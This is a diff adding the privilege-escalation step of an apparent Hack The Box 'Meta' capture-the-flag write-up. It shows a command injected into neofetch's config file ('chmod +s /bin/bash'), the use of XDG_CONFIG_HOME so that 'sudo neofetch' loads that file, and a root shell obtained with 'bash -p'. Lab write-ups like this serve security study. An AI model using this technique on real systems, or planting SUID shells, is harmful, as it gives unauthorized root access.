@@ -658,6 +658,156 @@ User thomas may run the following commands on meta:
 
 <br />
 
+This is very `dangerous`, because if we can `manipulate` the neofetch `config` file and `replace` it with a `malicious` one, we can `execute` a `command`.
 
+To do it, `first` we need to `find` the path of this `file`:
 
 <br />
+
+```bash
+thomas@meta:~$ find / -name "config.conf" 2>/dev/null
+/home/thomas/.config/neofetch/config.conf
+```
+
+<br />
+
+Now that we know where the `file` is, we `create` a `malicious` one that attributes `SUID` permissions to the `/bin/bash`:
+
+<br />
+
+```conf
+# See this wiki page for more info:
+# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
+chmod +s /bin/bash
+print_info() {
+    info title
+    info underline
+
+    info "OS" distro
+    info "Host" model
+    info "Kernel" kernel
+    info "Uptime" uptime
+    info "Packages" packages
+    info "Shell" shell
+    info "Resolution" resolution
+    info "DE" de
+    info "WM" wm
+    info "WM Theme" wm_theme
+    info "Theme" theme
+    info "Icons" icons
+    info "Terminal" term
+    info "Terminal Font" term_font
+    info "CPU" cpu
+    info "GPU" gpu
+    info "Memory" memory
+
+    # info "GPU Driver" gpu_driver  # Linux/macOS only
+    # info "CPU Usage" cpu_usage
+    # info "Disk" disk
+    # info "Battery" battery
+    # info "Font" font
+    # info "Song" song
+    # [[ $player ]] && prin "Music Player" "$player"
+    # info "Local IP" local_ip
+    # info "Public IP" public_ip
+    # info "Users" users
+    # info "Locale" locale  # This only works on glibc systems.
+
+    info cols
+}
+```
+
+<br />
+
+Now we run neofetch as root and check if the command has been executed:
+
+<br />
+
+```bash
+thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch
+       _,met$$$$$gg.          root@meta 
+    ,g$$$$$$$$$$$$$$$P.       --------- 
+  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
+ ,$$P'              `$$$.     Host: VMware Virtual Platform None 
+',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
+`d$$'     ,$P"'   .    $$$    Uptime: 2 hours, 43 mins 
+ $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
+ $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
+ $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7513 32- (2) @ 2.595GHz 
+ Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
+ `$$b      "-.__              Memory: 147MiB / 1994MiB 
+  `Y$$
+   `Y$$.                                              
+     `$$b.
+       `Y$$b.
+          `"Y$b._
+              `"""
+
+thomas@meta:~/.config/neofetch$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+```
+
+<br />
+
+Oh no!! It `seems` that shomething gone `wrong`, but this have an `explanation`.
+
+Every time that we run `neofetch`, it `loads` the `config` file of the `user` that is `runnig` it. That's why since we're running it as `root`, it's not loading our `malicious` file, `hosted` in the thomas `directory`.
+
+To solve this we will simply have to `manipulate` the `"XDG_CONFIG_HOME"` environment `variabel` and enter the `path` from where we want the `configuration` to be `loaded`:
+
+<br />
+
+```bash
+export XDG_CONFIG_HOME="/home/thomas/.config/"
+```
+
+<br />
+
+Now we change the config file again and run neofetch:
+
+<br />
+
+```bash
+thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch
+       _,met$$$$$gg.          root@meta 
+    ,g$$$$$$$$$$$$$$$P.       --------- 
+  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
+ ,$$P'              `$$$.     Host: VMware Virtual Platform None 
+',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
+`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 1 min 
+ $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
+ $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
+ $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7513 32- (2) @ 2.595GHz 
+ Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
+ `$$b      "-.__              Memory: 148MiB / 1994MiB 
+  `Y$$
+   `Y$$.                                              
+     `$$b.
+       `Y$$b.
+          `"Y$b._
+              `"""
+
+thomas@meta:~/.config/neofetch$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+```
+
+<br />
+
+Perfect! The `/bin/bash` has the `SUID` permission. Now we can `run` it as `root`:
+
+<br />
+
+```bash
+thomas@meta:~/.config/neofetch$ bash -p
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+7cc0a00fb0e0f33b024f5e2376xxxxxx
+```
+
+<br />
+
+Machine Meta rooted!!
+
+This machine is a bit old since HTB has launched it 2 years ago but it touches very interesting concepts, I hope you liked it!
+
+Keep hacking!!❤️❤️
